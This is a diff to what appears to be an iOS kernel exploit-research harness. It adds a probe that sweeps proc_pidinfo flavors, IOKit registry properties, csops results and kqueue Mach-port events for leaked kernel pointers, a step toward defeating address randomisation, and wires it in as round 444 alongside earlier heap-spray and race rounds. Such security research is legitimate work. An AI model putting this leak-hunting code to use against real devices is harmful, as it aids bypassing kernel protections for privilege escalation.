@@ -111,6 +111,7 @@ extern kern_return_t mach_vm_page_info(
 #include <sys/sysctl.h>
 #include <sys/socket.h>
 #include <sys/ioctl.h>
+#include <sys/event.h>
 /* kern_control.h not in iOS SDK — declare manually */
 #define CTLIOCGINFO 0xC0644E03
 #define AF_SYS_CONTROL 2
@@ -16947,6 +16948,313 @@ static void *r440b_read_thread(void *arg) {
         }
     }
     return NULL;
+}
+
+static void r441_probe(void) {
+    rlog("\n=== r441: proc_info + IOKit Registry + sysctl scan + kqueue ===\n\n");
+    fflush(stdout);
+
+    /* Vector A: proc_info syscall — various flavors */
+    rlog("  --- Vector A: proc_info syscall for kernel data ---\n");
+    {
+        /* proc_info is syscall #336 on ARM64 */
+        /* int proc_info(int callnum, int pid, int flavor, uint64_t arg, void *buffer, int buffersize) */
+        typedef int (*proc_info_fn)(int, int, int, uint64_t, void*, int);
+        proc_info_fn pinfo = (proc_info_fn)dlsym(RTLD_DEFAULT, "proc_info");
+
+        /* Also try proc_pidinfo directly */
+        typedef int (*proc_pidinfo_fn)(int, int, uint64_t, void*, int);
+        proc_pidinfo_fn ppinfo = (proc_pidinfo_fn)dlsym(RTLD_DEFAULT, "proc_pidinfo");
+
+        pid_t mypid = getpid();
+        rlog("    proc_info=%p, proc_pidinfo=%p, pid=%d\n", pinfo, ppinfo, mypid);
+
+        if (ppinfo) {
+            /* Try various proc_pidinfo flavors */
+            /* PROC_PIDTASKINFO = 4, PROC_PIDTASKALLINFO = 2, PROC_PIDTHREADINFO = 5 */
+            /* PROC_PIDVNODEPATHINFO = 9, PROC_PIDREGIONPATHINFO = 8 */
+            int flavors[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20};
+            int nflavors = sizeof(flavors)/sizeof(flavors[0]);
+
+            for (int fi = 0; fi < nflavors; fi++) {
+                uint8_t buf[4096];
+                memset(buf, 0, sizeof(buf));
+                int ret = ppinfo(mypid, flavors[fi], 0, buf, sizeof(buf));
+                if (ret > 0) {
+                    rlog("    flavor %d: ret=%d bytes\n", flavors[fi], ret);
+                    /* Scan for kernel pointers */
+                    uint64_t *qw = (uint64_t*)buf;
+                    int kptrs = 0;
+                    for (int i = 0; i < ret/8; i++) {
+                        if ((qw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("      +%d: 0x%016llx ← KPTR!\n", i*8, (unsigned long long)qw[i]);
+                            kptrs++;
+                            if (kptrs >= 5) break;
+                        }
+                    }
+                    if (kptrs == 0 && ret >= 32) {
+                        /* Show first few fields */
+                        rlog("      first: 0x%016llx 0x%016llx 0x%016llx 0x%016llx\n",
+                             (unsigned long long)qw[0], (unsigned long long)qw[1],
+                             (unsigned long long)qw[2], (unsigned long long)qw[3]);
+                    }
+                }
+            }
+        }
+
+        /* Try listpids */
+        typedef int (*proc_listpids_fn)(uint32_t, uint32_t, void*, int);
+        proc_listpids_fn listpids = (proc_listpids_fn)dlsym(RTLD_DEFAULT, "proc_listpids");
+        if (listpids) {
+            int pidbuf[256];
+            int ret = listpids(1 /* PROC_ALL_PIDS */, 0, pidbuf, sizeof(pidbuf));
+            rlog("    proc_listpids: %d bytes (%d pids)\n", ret, ret > 0 ? ret/4 : 0);
+        }
+
+        /* Try proc_regioninfo for our own process */
+        if (ppinfo) {
+            /* PROC_PIDREGIONINFO = 7 */
+            uint8_t buf[4096];
+            memset(buf, 0, sizeof(buf));
+            /* Use our text segment address as the region address */
+            uint64_t text_addr = (uint64_t)&r441_probe;
+            int ret = ppinfo(mypid, 7, text_addr, buf, sizeof(buf));
+            if (ret > 0) {
+                rlog("    PROC_PIDREGIONINFO for text: ret=%d\n", ret);
+                uint64_t *qw = (uint64_t*)buf;
+                for (int i = 0; i < ret/8 && i < 16; i++) {
+                    if (qw[i] != 0) {
+                        rlog("      +%d: 0x%016llx%s\n", i*8, (unsigned long long)qw[i],
+                             (qw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL ? " ← KPTR!" : "");
+                    }
+                }
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* Vector B: IOKit registry property enumeration */
+    rlog("\n  --- Vector B: IOKit registry scan for kernel metadata ---\n");
+    {
+        io_registry_entry_t root = IORegistryGetRootEntry(kIOMainPortDefault);
+        if (root) {
+            /* Get properties of root */
+            CFMutableDictionaryRef props = NULL;
+            IORegistryEntryCreateCFProperties(root, &props, kCFAllocatorDefault, 0);
+            if (props) {
+                CFIndex count = CFDictionaryGetCount(props);
+                rlog("    Root entry: %ld properties\n", (long)count);
+
+                /* Enumerate all keys looking for interesting values */
+                CFIndex n = CFDictionaryGetCount(props);
+                const void **keys = malloc(sizeof(void*) * n);
+                const void **vals = malloc(sizeof(void*) * n);
+                CFDictionaryGetKeysAndValues(props, keys, vals);
+
+                for (CFIndex i = 0; i < n; i++) {
+                    CFStringRef key = (CFStringRef)keys[i];
+                    char kbuf[256];
+                    CFStringGetCString(key, kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+
+                    CFTypeRef val = vals[i];
+                    CFTypeID tid = CFGetTypeID(val);
+
+                    if (tid == CFDataGetTypeID()) {
+                        CFDataRef dv = (CFDataRef)val;
+                        CFIndex len = CFDataGetLength(dv);
+                        if (len >= 8) {
+                            const uint64_t *qw = (const uint64_t*)CFDataGetBytePtr(dv);
+                            for (CFIndex j = 0; j < len/8; j++) {
+                                if ((qw[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    rlog("      '%s' +%ld: 0x%016llx ← KPTR!\n",
+                                         kbuf, (long)(j*8), (unsigned long long)qw[j]);
+                                }
+                            }
+                        }
+                    } else if (tid == CFNumberGetTypeID()) {
+                        int64_t nv = 0;
+                        CFNumberGetValue((CFNumberRef)val, kCFNumberSInt64Type, &nv);
+                        if (((uint64_t)nv & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            rlog("      '%s': 0x%016llx ← KPTR!\n", kbuf, (unsigned long long)nv);
+                        }
+                    }
+                }
+                free(keys);
+                free(vals);
+                CFRelease(props);
+            }
+
+            /* Iterate child entries looking for interesting drivers */
+            io_iterator_t iter;
+            kern_return_t kr = IORegistryEntryCreateIterator(root,
+                kIOServicePlane, kIORegistryIterateRecursively, &iter);
+            if (kr == KERN_SUCCESS) {
+                io_registry_entry_t entry;
+                int checked = 0;
+                int kptr_entries = 0;
+                while ((entry = IOIteratorNext(iter)) && checked < 200) {
+                    CFMutableDictionaryRef eprops = NULL;
+                    IORegistryEntryCreateCFProperties(entry, &eprops, kCFAllocatorDefault, 0);
+                    if (eprops) {
+                        CFIndex en = CFDictionaryGetCount(eprops);
+                        const void **ekeys = malloc(sizeof(void*) * en);
+                        const void **evals = malloc(sizeof(void*) * en);
+                        CFDictionaryGetKeysAndValues(eprops, ekeys, evals);
+
+                        for (CFIndex i = 0; i < en; i++) {
+                            CFTypeRef val = evals[i];
+                            if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                                CFDataRef dv = (CFDataRef)val;
+                                CFIndex len = CFDataGetLength(dv);
+                                if (len >= 8) {
+                                    const uint64_t *qw = (const uint64_t*)CFDataGetBytePtr(dv);
+                                    for (CFIndex j = 0; j < len/8; j++) {
+                                        if ((qw[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                            char name[128] = {0};
+                                            IORegistryEntryGetName(entry, name);
+                                            char kbuf[256];
+                                            CFStringGetCString((CFStringRef)ekeys[i], kbuf, sizeof(kbuf),
+                                                kCFStringEncodingUTF8);
+                                            rlog("      [%s] '%s' +%ld: 0x%016llx ← KPTR!\n",
+                                                 name, kbuf, (long)(j*8), (unsigned long long)qw[j]);
+                                            kptr_entries++;
+                                            if (kptr_entries >= 20) break;
+                                        }
+                                    }
+                                }
+                            } else if (CFGetTypeID(val) == CFNumberGetTypeID()) {
+                                int64_t nv = 0;
+                                CFNumberGetValue((CFNumberRef)val, kCFNumberSInt64Type, &nv);
+                                if (((uint64_t)nv & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    char name[128] = {0};
+                                    IORegistryEntryGetName(entry, name);
+                                    char kbuf[256];
+                                    CFStringGetCString((CFStringRef)ekeys[i], kbuf, sizeof(kbuf),
+                                        kCFStringEncodingUTF8);
+                                    rlog("      [%s] '%s': 0x%016llx ← KPTR!\n",
+                                         name, kbuf, (unsigned long long)nv);
+                                    kptr_entries++;
+                                }
+                            }
+                        }
+                        free(ekeys);
+                        free(evals);
+                        CFRelease(eprops);
+                    }
+                    IOObjectRelease(entry);
+                    checked++;
+                    if (kptr_entries >= 20) break;
+                }
+                rlog("    Checked %d registry entries, found %d kptr values\n", checked, kptr_entries);
+                IOObjectRelease(iter);
+            }
+            IOObjectRelease(root);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector C: csops syscall — codesigning info might contain kernel data */
+    rlog("\n  --- Vector C: csops for kernel data ---\n");
+    {
+        /* csops(pid, ops, useraddr, usersize) = syscall 169 */
+        typedef int (*csops_fn)(pid_t, unsigned int, void*, size_t);
+        csops_fn csops = (csops_fn)dlsym(RTLD_DEFAULT, "csops");
+
+        if (csops) {
+            /* CS_OPS_STATUS=0, CS_OPS_ENTITLEMENTS_BLOB=7, CS_OPS_IDENTITY=11 */
+            unsigned int ops[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
+            for (int i = 0; i < 16; i++) {
+                uint8_t buf[4096];
+                memset(buf, 0, sizeof(buf));
+                int ret = csops(getpid(), ops[i], buf, sizeof(buf));
+                if (ret == 0) {
+                    /* Scan for kernel pointers */
+                    uint64_t *qw = (uint64_t*)buf;
+                    int kptrs = 0;
+                    /* Check how much data was returned (find last non-zero) */
+                    int last_nz = 0;
+                    for (int j = 0; j < 512; j++) {
+                        if (qw[j] != 0) last_nz = j;
+                    }
+                    if (last_nz > 0) {
+                        rlog("    csops(%u): ret=0, data_end=+%d\n", ops[i], (last_nz+1)*8);
+                        for (int j = 0; j <= last_nz && j < 8; j++) {
+                            rlog("      +%d: 0x%016llx%s\n", j*8, (unsigned long long)qw[j],
+                                 (qw[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL ? " ← KPTR!" : "");
+                        }
+                        for (int j = 0; j <= last_nz; j++) {
+                            if ((qw[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) kptrs++;
+                        }
+                        if (kptrs > 0) rlog("      KPTRS: %d\n", kptrs);
+                    }
+                }
+            }
+        } else {
+            rlog("    csops not found\n");
+        }
+    }
+    fflush(stdout);
+
+    /* Vector D: kqueue with EVFILT_MACHPORT */
+    rlog("\n  --- Vector D: kqueue EVFILT_MACHPORT for port data ---\n");
+    {
+        int kq = kqueue();
+        if (kq >= 0) {
+            /* Create a port and watch it */
+            mach_port_t port;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
+
+            struct kevent kev;
+            EV_SET(&kev, port, EVFILT_MACHPORT, EV_ADD, 0, 0, NULL);
+            int ret = kevent(kq, &kev, 1, NULL, 0, NULL);
+            rlog("    kqueue+EVFILT_MACHPORT register: ret=%d, errno=%d\n", ret, ret < 0 ? errno : 0);
+
+            /* Send a message to trigger the event */
+            struct {
+                mach_msg_header_t hdr;
+                uint64_t payload[4];
+            } msg;
+            memset(&msg, 0, sizeof(msg));
+            msg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
+            msg.hdr.msgh_size = sizeof(msg);
+            msg.hdr.msgh_remote_port = port;
+            msg.hdr.msgh_local_port = MACH_PORT_NULL;
+            msg.payload[0] = 0x1234567890ABCDEFULL;
+
+            mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+            mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+
+            /* Check for events */
+            struct kevent events[4];
+            struct timespec ts = {0, 10000000}; /* 10ms */
+            int nevents = kevent(kq, NULL, 0, events, 4, &ts);
+            rlog("    kevent poll: %d events\n", nevents);
+            for (int i = 0; i < nevents; i++) {
+                rlog("      event[%d]: ident=%llu filter=%d flags=0x%x fflags=0x%x data=%lld udata=%p\n",
+                     i, (unsigned long long)events[i].ident, events[i].filter,
+                     events[i].flags, events[i].fflags,
+                     (long long)events[i].data, events[i].udata);
+                /* data field might contain a kernel address */
+                if (((uint64_t)events[i].data & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                    rlog("      *** KPTR IN EVENT DATA! ***\n");
+                }
+            }
+
+            /* Receive and cleanup */
+            struct {
+                mach_msg_header_t hdr;
+                uint64_t payload[4];
+                mach_msg_trailer_t trailer;
+            } rmsg;
+            mach_msg(&rmsg.hdr, MACH_RCV_MSG, 0, sizeof(rmsg), port, 0, MACH_PORT_NULL);
+            mach_port_deallocate(mach_task_self(), port);
+            close(kq);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r441 complete ===\n");
+    fflush(stdout);
 }
 
 static void r440_probe(void) {
@@ -77599,6 +77907,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 444) {
+            rlog("*** rounds=444: proc_info + IOKit Registry + csops + kqueue ***\n\n");
+            fflush(stdout);
+            r441_probe();
+            goto done;
+        }
         if (rounds == 443) {
             rlog("*** rounds=443: Property Store Race + OOL Heap Spray ***\n\n");
             fflush(stdout);
@@ -80283,7 +80597,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
